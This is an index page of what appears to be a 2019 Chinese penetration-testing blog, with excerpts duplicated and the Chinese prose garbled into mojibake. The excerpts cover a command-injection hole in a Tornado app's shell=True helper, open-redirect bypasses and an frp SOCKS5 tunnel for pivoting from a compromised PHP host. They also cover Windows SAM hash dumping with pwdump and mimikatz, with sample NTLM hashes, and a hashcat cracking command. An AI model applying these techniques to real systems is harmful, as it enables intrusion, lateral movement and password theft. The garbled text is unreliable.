<li><p>ä¸€èˆ¬pythonå¼€å‘çš„æ—¶å€™ï¼Œæ ¹ç›®å½•å¯èƒ½å­˜åœ¨æ–‡ä»¶: <code>README.md</code>,<code>requirements.txt</code>,<code>app.py</code>,<code>.git/config</code>ä¹‹ç±»çš„æ–‡ä»¶</p>
</li>
</ol>
<h3 id="è¿œç¨‹å‘½ä»¤æ‰§è¡Œ"><a href="#è¿œç¨‹å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="è¿œç¨‹å‘½ä»¤æ‰§è¡Œ"></a>è¿œç¨‹å‘½ä»¤æ‰§è¡Œ</h3><p>è¯»å–åˆ°æºä»£ç ä¹‹åï¼Œä¸­é—´æœ‰ä¸ä¸€éƒ¨åˆ†çš„ä»£ç æ˜¯è¿™æ ·çš„ï¼Œæ¥æ”¶è¯·æ±‚ä¼ è¿‡æ¥çš„å‚æ•°ï¼Œç„¶ååˆ—ç›®å½•:</p>
<pre class="line-numbers language-none"><code class="language-none">res &#x3D; exec_cmd4(&quot;ls -l %s|awk &#39;&#123;print $5&#125;&#39;&quot; % abs_file_name)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>exec_cmd4æ˜¯å¼€å‘è‡ªå·±å†™çš„å‡½æ•°ï¼Œé€šè¿‡ä»»æ„æ–‡ä»¶è¯»å–å¯ä»¥æ‰¾åˆ°å‡½æ•°å®šä¹‰:</p>
<pre class="line-numbers language-none"><code class="language-none">def exec_cmd4(cmd, no_print&#x3D;False):    
	if not no_print:        
		logger.debug(cmd)    
		p &#x3D; subprocess.Popen(cmd, executable&#x3D;\&quot;&#x2F;bin&#x2F;bash\&quot;, shell&#x3D;True, stderr&#x3D;subprocess.PIPE, stdout&#x3D;subprocess.PIPE)    
		return p.communicate();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>è¿™é‡Œå­˜åœ¨å‘½ä»¤æ³¨å…¥æ¼æ´ï¼Œé“¾æ¥: <a target="_blank" rel="noopener" href="https://strcpy.me/index.php/archives/787/">https://strcpy.me/index.php/archives/787/</a></p>
<p>æŠ„ä¸€ä¸‹demoä»£ç :</p>
	

	</div>
  <a type="button" href="/2019/06/18/tornado-pentest.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>å¸¸è§è¶Šæƒæµ‹è¯•å®Œäº†ä¹‹åï¼Œæœ‰ä¸€ä¸ªä¸Šä¼ æ–‡ä»¶çš„åœ°æ–¹ï¼Œä¸Šä¼ çš„æ–‡ä»¶åå­˜åœ¨åå°„xssï¼Œä¸»è¦è®°å½•ä¸‹ä»»æ„æ–‡ä»¶è¯»å–å’Œè¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚</p>
<h3 id="ä»»æ„æ–‡ä»¶è¯»å–"><a href="#ä»»æ„æ–‡ä»¶è¯»å–" class="headerlink" title="ä»»æ„æ–‡ä»¶è¯»å–"></a>ä»»æ„æ–‡ä»¶è¯»å–</h3><ol>
<li><p>åˆšå¼€å§‹æµ‹è¯•ä»»æ„æ–‡ä»¶è¯»å–çš„æ—¶å€™ï¼Œæ‰¾ä¸åˆ°è¦è¯»å–çš„æ–‡ä»¶ï¼Œé—®äº†å¼€å‘ç›®å½•ç»“æ„æ‰è¯»å‡ºæ¥ï¼Œå¥½è ¢ã€‚å®é™…å¯ä»¥é€šè¿‡<code>/proc/self/cmdline</code> æŸ¥çœ‹å½“å‰ç¨‹åºçš„è¿è¡Œå‚æ•°ï¼Œå¯ä»¥è·å–åˆ°æºä»£ç æ–‡ä»¶åã€‚</p>
</li>
<li><p>ä¸€èˆ¬pythonå¼€å‘çš„æ—¶å€™ï¼Œæ ¹ç›®å½•å¯èƒ½å­˜åœ¨æ–‡ä»¶: <code>README.md</code>,<code>requirements.txt</code>,<code>app.py</code>,<code>.git/config</code>ä¹‹ç±»çš„æ–‡ä»¶</p>
</li>
</ol>
<h3 id="è¿œç¨‹å‘½ä»¤æ‰§è¡Œ"><a href="#è¿œç¨‹å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="è¿œç¨‹å‘½ä»¤æ‰§è¡Œ"></a>è¿œç¨‹å‘½ä»¤æ‰§è¡Œ</h3><p>è¯»å–åˆ°æºä»£ç ä¹‹åï¼Œä¸­é—´æœ‰ä¸ä¸€éƒ¨åˆ†çš„ä»£ç æ˜¯è¿™æ ·çš„ï¼Œæ¥æ”¶è¯·æ±‚ä¼ è¿‡æ¥çš„å‚æ•°ï¼Œç„¶ååˆ—ç›®å½•:</p>
<pre class="line-numbers language-none"><code class="language-none">res &#x3D; exec_cmd4(&quot;ls -l %s|awk &#39;&#123;print $5&#125;&#39;&quot; % abs_file_name)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>exec_cmd4æ˜¯å¼€å‘è‡ªå·±å†™çš„å‡½æ•°ï¼Œé€šè¿‡ä»»æ„æ–‡ä»¶è¯»å–å¯ä»¥æ‰¾åˆ°å‡½æ•°å®šä¹‰:</p>
<pre class="line-numbers language-none"><code class="language-none">def exec_cmd4(cmd, no_print&#x3D;False):    
	if not no_print:        
		logger.debug(cmd)    
		p &#x3D; subprocess.Popen(cmd, executable&#x3D;\&quot;&#x2F;bin&#x2F;bash\&quot;, shell&#x3D;True, stderr&#x3D;subprocess.PIPE, stdout&#x3D;subprocess.PIPE)    
		return p.communicate();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>è¿™é‡Œå­˜åœ¨å‘½ä»¤æ³¨å…¥æ¼æ´ï¼Œé“¾æ¥: <a target="_blank" rel="noopener" href="https://strcpy.me/index.php/archives/787/">https://strcpy.me/index.php/archives/787/</a></p>
<p>æŠ„ä¸€ä¸‹demoä»£ç :</p>
	
	</div>
  <a type="button" href="/2019/06/18/tornado-pentest.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2019/05/27/web-url-hacking.html" >Webçš„URL Hacking</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2019-05-27  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>ç¢°åˆ°ä¸€ä¸ªä»»æ„URLè·³è½¬æ¼æ´ï¼Œç¬¬ä¸€æ¬¡æµ‹çš„æ—¶å€™å±…ç„¶æ²¡æœ‰æµ‹å‡ºæ¥ï¼Œè®°å½•ä¸‹ç¬”è®°ï¼Œä»¥ä¸‹æ˜¯ç»•è¿‡çš„æ–¹å¼:</p>
<h3 id="0x01-å°è€é¼ è·³è½¬ç»•è¿‡"><a href="#0x01-å°è€é¼ è·³è½¬ç»•è¿‡" class="headerlink" title="0x01: å°è€é¼ è·³è½¬ç»•è¿‡"></a>0x01: å°è€é¼ è·³è½¬ç»•è¿‡</h3><p><img src="/2019/05/27/web-url-hacking/15589534351266.jpg"></p>
<h3 id="0x02-è·³è½¬ç»•è¿‡"><a href="#0x02-è·³è½¬ç»•è¿‡" class="headerlink" title="0x02: ?è·³è½¬ç»•è¿‡"></a>0x02: ?è·³è½¬ç»•è¿‡</h3><p><img src="/2019/05/27/web-url-hacking/15589535373195.jpg"></p>
<h3 id="0x03-ç»•è¿‡"><a href="#0x03-ç»•è¿‡" class="headerlink" title="0x03: #ç»•è¿‡"></a>0x03: #ç»•è¿‡</h3><p><img src="/2019/05/27/web-url-hacking/15589537014838.jpg"></p>
<h3 id="0x04-ç»•è¿‡"><a href="#0x04-ç»•è¿‡" class="headerlink" title="0x04: /ç»•è¿‡"></a>0x04: /ç»•è¿‡</h3><p><img src="/2019/05/27/web-url-hacking/15589537987606.jpg"></p>
<h3 id="0x05-ç»•è¿‡"><a href="#0x05-ç»•è¿‡" class="headerlink" title="0x05: \ç»•è¿‡"></a>0x05: \ç»•è¿‡</h3>
	

	</div>
  <a type="button" href="/2019/05/27/web-url-hacking.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>ç¢°åˆ°ä¸€ä¸ªä»»æ„URLè·³è½¬æ¼æ´ï¼Œç¬¬ä¸€æ¬¡æµ‹çš„æ—¶å€™å±…ç„¶æ²¡æœ‰æµ‹å‡ºæ¥ï¼Œè®°å½•ä¸‹ç¬”è®°ï¼Œä»¥ä¸‹æ˜¯ç»•è¿‡çš„æ–¹å¼:</p>
<h3 id="0x01-å°è€é¼ è·³è½¬ç»•è¿‡"><a href="#0x01-å°è€é¼ è·³è½¬ç»•è¿‡" class="headerlink" title="0x01: å°è€é¼ è·³è½¬ç»•è¿‡"></a>0x01: å°è€é¼ è·³è½¬ç»•è¿‡</h3><p><img src="/2019/05/27/web-url-hacking/15589534351266.jpg"></p>
<h3 id="0x02-è·³è½¬ç»•è¿‡"><a href="#0x02-è·³è½¬ç»•è¿‡" class="headerlink" title="0x02: ?è·³è½¬ç»•è¿‡"></a>0x02: ?è·³è½¬ç»•è¿‡</h3><p><img src="/2019/05/27/web-url-hacking/15589535373195.jpg"></p>
<h3 id="0x03-ç»•è¿‡"><a href="#0x03-ç»•è¿‡" class="headerlink" title="0x03: #ç»•è¿‡"></a>0x03: #ç»•è¿‡</h3><p><img src="/2019/05/27/web-url-hacking/15589537014838.jpg"></p>
<h3 id="0x04-ç»•è¿‡"><a href="#0x04-ç»•è¿‡" class="headerlink" title="0x04: /ç»•è¿‡"></a>0x04: /ç»•è¿‡</h3><p><img src="/2019/05/27/web-url-hacking/15589537987606.jpg"></p>
<h3 id="0x05-ç»•è¿‡"><a href="#0x05-ç»•è¿‡" class="headerlink" title="0x05: \ç»•è¿‡"></a>0x05: \ç»•è¿‡</h3>
	
	</div>
  <a type="button" href="/2019/05/27/web-url-hacking.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2019/05/08/frps.html" >frpsçš„socks5ä»£ç†</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2019-05-08  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>åœ¨PHPçš„ç½‘ç«™getshellä¹‹åï¼Œæœ‰ä¸€ä¸ªæ¯”è¾ƒå¤§çš„Bæ®µå†…ç½‘ï¼Œæµ‹è¯•äº†ä¸€ä¸‹å‡ ä¸ªä»£ç†éƒ½ä¸å¤ªå¥½ç”¨ï¼Œæœ€åè¯•äº†frpsï¼Œngrokè¿˜æ²¡æµ‹è¯•ã€‚</p>
<p>é¦–å…ˆæ˜¯reGeorg,å¦‚æœæ˜¯Linuxçš„è¯éœ€è¦ä¸Šä¼ no-socketçš„æ–‡ä»¶ï¼Œä½†æ˜¯å®é™…æµ‹è¯•ï¼Œç½‘ç«™æ‰“å¼€ç‰¹åˆ«æ…¢ã€‚ pass</p>
<p>å…¶æ¬¡æ˜¯ewï¼Œä¹‹å‰åœ¨windowsä¸Šé¢æµ‹è¯•è¿‡ewï¼Œæ•ˆæœè¿˜ä¸é”™ï¼Œä¸è¿‡æ²¡æœ‰æ‰«ææ¯”è¾ƒå¤§çš„å±€åŸŸç½‘ã€‚è¿™æ¬¡æµ‹è¯•äº†ä¸‹ï¼Œä¸­é—´æ‰«åˆ°ä¸€åŠå‡ºç°äº†æ®µé”™è¯¯ã€‚pass</p>
<p>æœ€åè¯•frpsï¼Œå®é™…æ•ˆæœä¸é”™ï¼Œè‡³å°‘å¯ä»¥è§£å†³é—®é¢˜äº†ã€‚é…ç½®æ–‡ä»¶è¿™æ ·çš„:</p>
<pre class="line-numbers language-none"><code class="language-none">frps.ini: 

[common]
bind_port &#x3D; 10086
privilege_token &#x3D; [passwd]
max_pool_count &#x3D; 50
dashboard_port &#x3D; [port]
dashboard_user &#x3D; [user]
dashboard_pwd &#x3D; [password]
use_encryption &#x3D; true
use_compression &#x3D; true<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ä¸Šé¢è¯•åœ¨vpsä¸Šé¢å¯åŠ¨ï¼Œä¼šåœ¨å¯¹åº”ç«¯å£å¼€ä¸€ä¸ªwebæœåŠ¡ï¼Œçœ‹åˆ°å·²ç»å¯åŠ¨çš„æµé‡å’ŒèŠ‚ç‚¹å­˜æ´»</p>
<pre class="line-numbers language-none"><code class="language-none">frpc.ini

[common]
server_addr &#x3D; [vps ip]
server_port &#x3D; 10086
privilege_token &#x3D; [passwd]
max_pool_count &#x3D; 50


[socks5]
type &#x3D; tcp
remote_port &#x3D; [port]
plugin &#x3D; socks5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>è¿™ä¸ªåœ¨è¢«æ§åˆ¶ä¸»æœºä¸Šå¯åŠ¨ï¼Œè¿è¡Œå®Œä¹‹åï¼Œvpsçš„remote_portç«¯å£å°±ä¼šå¼€ä¸€ä¸ªsocks5çš„ä»£ç†ï¼Œè¿™æ ·å°±è¿›å…¥åˆ°è¢«æ§ä¸»æœºçš„ç½‘ç»œé‡Œé¢ã€‚nmapæ‰«æè¦å¸¦ä¸Š<code>-sT -Pn</code>é€‰é¡¹ã€‚</p>

	

	</div>
  <a type="button" href="/2019/05/08/frps.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>åœ¨PHPçš„ç½‘ç«™getshellä¹‹åï¼Œæœ‰ä¸€ä¸ªæ¯”è¾ƒå¤§çš„Bæ®µå†…ç½‘ï¼Œæµ‹è¯•äº†ä¸€ä¸‹å‡ ä¸ªä»£ç†éƒ½ä¸å¤ªå¥½ç”¨ï¼Œæœ€åè¯•äº†frpsï¼Œngrokè¿˜æ²¡æµ‹è¯•ã€‚</p>
<p>é¦–å…ˆæ˜¯reGeorg,å¦‚æœæ˜¯Linuxçš„è¯éœ€è¦ä¸Šä¼ no-socketçš„æ–‡ä»¶ï¼Œä½†æ˜¯å®é™…æµ‹è¯•ï¼Œç½‘ç«™æ‰“å¼€ç‰¹åˆ«æ…¢ã€‚ pass</p>
<p>å…¶æ¬¡æ˜¯ewï¼Œä¹‹å‰åœ¨windowsä¸Šé¢æµ‹è¯•è¿‡ewï¼Œæ•ˆæœè¿˜ä¸é”™ï¼Œä¸è¿‡æ²¡æœ‰æ‰«ææ¯”è¾ƒå¤§çš„å±€åŸŸç½‘ã€‚è¿™æ¬¡æµ‹è¯•äº†ä¸‹ï¼Œä¸­é—´æ‰«åˆ°ä¸€åŠå‡ºç°äº†æ®µé”™è¯¯ã€‚pass</p>
<p>æœ€åè¯•frpsï¼Œå®é™…æ•ˆæœä¸é”™ï¼Œè‡³å°‘å¯ä»¥è§£å†³é—®é¢˜äº†ã€‚é…ç½®æ–‡ä»¶è¿™æ ·çš„:</p>
<pre class="line-numbers language-none"><code class="language-none">frps.ini: 

[common]
bind_port &#x3D; 10086
privilege_token &#x3D; [passwd]
max_pool_count &#x3D; 50
dashboard_port &#x3D; [port]
dashboard_user &#x3D; [user]
dashboard_pwd &#x3D; [password]
use_encryption &#x3D; true
use_compression &#x3D; true<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ä¸Šé¢è¯•åœ¨vpsä¸Šé¢å¯åŠ¨ï¼Œä¼šåœ¨å¯¹åº”ç«¯å£å¼€ä¸€ä¸ªwebæœåŠ¡ï¼Œçœ‹åˆ°å·²ç»å¯åŠ¨çš„æµé‡å’ŒèŠ‚ç‚¹å­˜æ´»</p>
<pre class="line-numbers language-none"><code class="language-none">frpc.ini

[common]
server_addr &#x3D; [vps ip]
server_port &#x3D; 10086
privilege_token &#x3D; [passwd]
max_pool_count &#x3D; 50


[socks5]
type &#x3D; tcp
remote_port &#x3D; [port]
plugin &#x3D; socks5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>è¿™ä¸ªåœ¨è¢«æ§åˆ¶ä¸»æœºä¸Šå¯åŠ¨ï¼Œè¿è¡Œå®Œä¹‹åï¼Œvpsçš„remote_portç«¯å£å°±ä¼šå¼€ä¸€ä¸ªsocks5çš„ä»£ç†ï¼Œè¿™æ ·å°±è¿›å…¥åˆ°è¢«æ§ä¸»æœºçš„ç½‘ç»œé‡Œé¢ã€‚nmapæ‰«æè¦å¸¦ä¸Š<code>-sT -Pn</code>é€‰é¡¹ã€‚</p>

	
	</div>
  <a type="button" href="/2019/05/08/frps.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2019/04/02/OSCP-experience.html" >OSCPç»éªŒ</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2019-04-02  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<h2 id="0x01-ç½‘ç»œé—®é¢˜"><a href="#0x01-ç½‘ç»œé—®é¢˜" class="headerlink" title="0x01: ç½‘ç»œé—®é¢˜"></a>0x01: ç½‘ç»œé—®é¢˜</h2><pre class="line-numbers language-none"><code class="language-none">socks-proxy 127.0.0.1 6876
uth-user-pass auth.txt
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>åœ¨openvpnçš„é…ç½®æ–‡ä»¶é‡Œé¢ï¼Œæˆ‘åŠ äº†ä¸Šé¢ä¸¤è¡Œã€‚<br>ç¬¬ä¸€è¡Œå› ä¸ºå›½å†…ç½‘ç»œä¸ç¨³å®šï¼Œæˆ‘åŠ äº†ssçš„ä»£ç†ï¼Œåæ¥æ¢æˆäº†v2ray.<br>ç¬¬äºŒè¡Œæ˜¯ç†ç”±åŒä¸Šï¼Œå› ä¸ºç½‘ç»œä¸ç¨³å®šï¼Œæ¯æ¬¡è¿æ¥VPNéƒ½è¦è¾“å…¥ç”¨æˆ·å¯†ç ï¼Œè¿™æ ·æ–¹ä¾¿ç‚¹.</p>
<p>å…·ä½“ç½‘ç»œä¸ç¨³å®šæœ‰ä¸¤ä¸ªè¡¨ç°:</p>
<ol>
<li>nmapæ‰«æå…¨éƒ¨çš„ç«¯å£é•¿æ—¶é—´æ²¡æœ‰ååº”.</li>
<li>dirbusteræ‰«æçš„æ—¶å€™ä¼šå¡æ­»è¿›è¡Œä¸ä¸‹å»äº†.</li>
</ol>
<p>ä¸Šé¢ä¸¤ä¸ªé—®é¢˜æœ‰ä¸¤ä¸ªè§£å†³æ–¹æ³•:</p>
<ol>
<li>nmapæ¢æˆ<a target="_blank" rel="noopener" href="https://github.com/AnthraX1/InsightScan">https://github.com/AnthraX1/InsightScan</a>, å…ˆç”¨å•æ–‡ä»¶æ‰«æå…¨éƒ¨çš„å¼€æ”¾ç«¯å£ï¼Œç„¶åç”¨nmapæ‰«æå¼€æ”¾ç«¯å£æœåŠ¡: <code>nmap -sS -sV -sC &lt;IP&gt; -p &lt;PORT&gt;</code></li>
<li>dirbusteræ¢æˆgobusterï¼Œè¯å…¸ä¸å˜ï¼Œçº¿ç¨‹æ§åˆ¶åœ¨25ä¸ªå·¦å³.</li>
</ol>
<h2 id="0x02-æŠ¥å‘Šé—®é¢˜"><a href="#0x02-æŠ¥å‘Šé—®é¢˜" class="headerlink" title="0x02: æŠ¥å‘Šé—®é¢˜"></a>0x02: æŠ¥å‘Šé—®é¢˜</h2><p>æˆ‘çš„æŠ¥å‘Šæ ¼å¼å’Œä¸‹é¢è¿™ä¸ªäººçš„å·®ä¸å¤šã€‚å¦‚æœå¯ä»¥å°½é‡ä½¿ç”¨å®˜æ–¹çš„æ¨¡ç‰ˆå°±ç”¨å®˜æ–¹çš„æ¨¡ç‰ˆï¼Œä¸ç„¶å®¹æ˜“å‡‰ï¼Œæˆ‘å†™äº†50å¤šé¡µçš„æŠ¥å‘Šï¼Œåšäº†4é“åŠé¢˜ç›®ã€‚<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaoxiaoleo/p/9040339.html">https://www.cnblogs.com/xiaoxiaoleo/p/9040339.html</a></p>
<h2 id="0x03-ç›‘è€ƒé—®é¢˜"><a href="#0x03-ç›‘è€ƒé—®é¢˜" class="headerlink" title="0x03: ç›‘è€ƒé—®é¢˜"></a>0x03: ç›‘è€ƒé—®é¢˜</h2>
	

	</div>
  <a type="button" href="/2019/04/02/OSCP-experience.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<h2 id="0x01-ç½‘ç»œé—®é¢˜"><a href="#0x01-ç½‘ç»œé—®é¢˜" class="headerlink" title="0x01: ç½‘ç»œé—®é¢˜"></a>0x01: ç½‘ç»œé—®é¢˜</h2><pre class="line-numbers language-none"><code class="language-none">socks-proxy 127.0.0.1 6876
uth-user-pass auth.txt
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>åœ¨openvpnçš„é…ç½®æ–‡ä»¶é‡Œé¢ï¼Œæˆ‘åŠ äº†ä¸Šé¢ä¸¤è¡Œã€‚<br>ç¬¬ä¸€è¡Œå› ä¸ºå›½å†…ç½‘ç»œä¸ç¨³å®šï¼Œæˆ‘åŠ äº†ssçš„ä»£ç†ï¼Œåæ¥æ¢æˆäº†v2ray.<br>ç¬¬äºŒè¡Œæ˜¯ç†ç”±åŒä¸Šï¼Œå› ä¸ºç½‘ç»œä¸ç¨³å®šï¼Œæ¯æ¬¡è¿æ¥VPNéƒ½è¦è¾“å…¥ç”¨æˆ·å¯†ç ï¼Œè¿™æ ·æ–¹ä¾¿ç‚¹.</p>
<p>å…·ä½“ç½‘ç»œä¸ç¨³å®šæœ‰ä¸¤ä¸ªè¡¨ç°:</p>
<ol>
<li>nmapæ‰«æå…¨éƒ¨çš„ç«¯å£é•¿æ—¶é—´æ²¡æœ‰ååº”.</li>
<li>dirbusteræ‰«æçš„æ—¶å€™ä¼šå¡æ­»è¿›è¡Œä¸ä¸‹å»äº†.</li>
</ol>
<p>ä¸Šé¢ä¸¤ä¸ªé—®é¢˜æœ‰ä¸¤ä¸ªè§£å†³æ–¹æ³•:</p>
<ol>
<li>nmapæ¢æˆ<a target="_blank" rel="noopener" href="https://github.com/AnthraX1/InsightScan">https://github.com/AnthraX1/InsightScan</a>, å…ˆç”¨å•æ–‡ä»¶æ‰«æå…¨éƒ¨çš„å¼€æ”¾ç«¯å£ï¼Œç„¶åç”¨nmapæ‰«æå¼€æ”¾ç«¯å£æœåŠ¡: <code>nmap -sS -sV -sC &lt;IP&gt; -p &lt;PORT&gt;</code></li>
<li>dirbusteræ¢æˆgobusterï¼Œè¯å…¸ä¸å˜ï¼Œçº¿ç¨‹æ§åˆ¶åœ¨25ä¸ªå·¦å³.</li>
</ol>
<h2 id="0x02-æŠ¥å‘Šé—®é¢˜"><a href="#0x02-æŠ¥å‘Šé—®é¢˜" class="headerlink" title="0x02: æŠ¥å‘Šé—®é¢˜"></a>0x02: æŠ¥å‘Šé—®é¢˜</h2><p>æˆ‘çš„æŠ¥å‘Šæ ¼å¼å’Œä¸‹é¢è¿™ä¸ªäººçš„å·®ä¸å¤šã€‚å¦‚æœå¯ä»¥å°½é‡ä½¿ç”¨å®˜æ–¹çš„æ¨¡ç‰ˆå°±ç”¨å®˜æ–¹çš„æ¨¡ç‰ˆï¼Œä¸ç„¶å®¹æ˜“å‡‰ï¼Œæˆ‘å†™äº†50å¤šé¡µçš„æŠ¥å‘Šï¼Œåšäº†4é“åŠé¢˜ç›®ã€‚<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaoxiaoleo/p/9040339.html">https://www.cnblogs.com/xiaoxiaoleo/p/9040339.html</a></p>
<h2 id="0x03-ç›‘è€ƒé—®é¢˜"><a href="#0x03-ç›‘è€ƒé—®é¢˜" class="headerlink" title="0x03: ç›‘è€ƒé—®é¢˜"></a>0x03: ç›‘è€ƒé—®é¢˜</h2>
	
	</div>
  <a type="button" href="/2019/04/02/OSCP-experience.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2019/03/01/hashcat.html" >Hashcatç¬”è®°</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2019-03-01  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>åœ¨windowsé‡Œé¢ä»»æ„è¯»å–çš„æ–‡ä»¶ï¼Œæ‰¾åˆ°äº†sam.oldæ–‡ä»¶å’Œsystem.oldæ–‡ä»¶ï¼Œè¯»å–ä¹‹åç”¨burpä¿å­˜åˆ°æ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨å¦‚ä¸‹çš„å‘½ä»¤æ¥æå–å¯†ç :</p>
<pre class="line-numbers language-none"><code class="language-none">root@kali:~# cachedump
usage: &#x2F;usr&#x2F;bin&#x2F;cachedump &lt;system hive&gt; &lt;security hive&gt;

root@kali:~# lsadump
usage: &#x2F;usr&#x2F;bin&#x2F;lsadump &lt;system hive&gt; &lt;security hive&gt;

root@kali:~# pwdump
usage: &#x2F;usr&#x2F;bin&#x2F;pwdump &lt;system hive&gt; &lt;SAM hive&gt;

æˆ–è€…mimikatz: lsadump::sam &#x2F;system:&lt;SYSTEM&gt; &#x2F;SAM:&lt;SAM&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æå–çš„æ ¼å¼å¤§æ¦‚æ˜¯è¿™æ ·:</p>
<pre class="line-numbers language-none"><code class="language-none">root@kali:~# pwdump system sam
Administrator:500:41aa818b512a8c0e72381e4c174e281b:1896d0a309184775f67c14d14b5c365a:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HelpAssistant:1000:667d6c58d451dbf236ae37ab1de3b9f7:af733642ab69e156ba0c219d3bbc3c83:::
SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:8dffa305e2bee837f279c2c0b082affb:::<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<p>ç”¨æˆ·åç§°æ˜¯:Administrator<br>RIDæ˜¯: 500<br>LM-HASHå€¼: 41aa818b512a8c0e72381e4c174e281b<br>NT-HASH(NTLM)å€¼: 1896d0a309184775f67c14d14b5c365a</p>
<p>å¯ä»¥ä½¿ç”¨hashcatæ¥è·‘å¯†ç :</p>
<pre class="line-numbers language-none"><code class="language-none">hashcat -m 1000 -a 0 --force hash.txt &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>å…¶ä¸­çš„hash.txt å¯ä»¥æŒ‡çš„æ˜¯ä¸Šé¢çš„NT-HASHã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">-m 1000 hashçš„ç±»å‹ï¼Œè¿™é‡Œæ˜¯NTLM
-a 0  0è¡¨ç¤ºè¯å…¸ç¢°æ’ï¼Œè¿™é‡Œæ˜¯kaliè‡ªå¸¦çš„è¾å…¸ï¼Œè¿˜æœ‰3è¡¨ç¤ºä½¿ç”¨GPUæ¥çˆ†ç ´ï¼Œä¸ç”¨æŒ‡å®šè¯å…¸ã€‚
--force å¿½ç•¥æ— æ˜¾å¡ï¼Œç›´æ¥è·‘
hash.txt å°±æ˜¯ä¸Šé¢çš„NT-HASH
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li><p><a target="_blank" rel="noopener" href="https://www.objectif-securite.ch/en/ophcrack.php">https://www.objectif-securite.ch/en/ophcrack.php</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://cyberloginit.com/2017/12/26/hashcat-ntlm-brute-force.html">https://cyberloginit.com/2017/12/26/hashcat-ntlm-brute-force.html</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4">https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4</a></p>
</li>
</ul>
	

	</div>
  <a type="button" href="/2019/03/01/hashcat.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>åœ¨windowsé‡Œé¢ä»»æ„è¯»å–çš„æ–‡ä»¶ï¼Œæ‰¾åˆ°äº†sam.oldæ–‡ä»¶å’Œsystem.oldæ–‡ä»¶ï¼Œè¯»å–ä¹‹åç”¨burpä¿å­˜åˆ°æ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨å¦‚ä¸‹çš„å‘½ä»¤æ¥æå–å¯†ç :</p>
<pre class="line-numbers language-none"><code class="language-none">root@kali:~# cachedump
usage: &#x2F;usr&#x2F;bin&#x2F;cachedump &lt;system hive&gt; &lt;security hive&gt;

root@kali:~# lsadump
usage: &#x2F;usr&#x2F;bin&#x2F;lsadump &lt;system hive&gt; &lt;security hive&gt;

root@kali:~# pwdump
usage: &#x2F;usr&#x2F;bin&#x2F;pwdump &lt;system hive&gt; &lt;SAM hive&gt;

æˆ–è€…mimikatz: lsadump::sam &#x2F;system:&lt;SYSTEM&gt; &#x2F;SAM:&lt;SAM&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

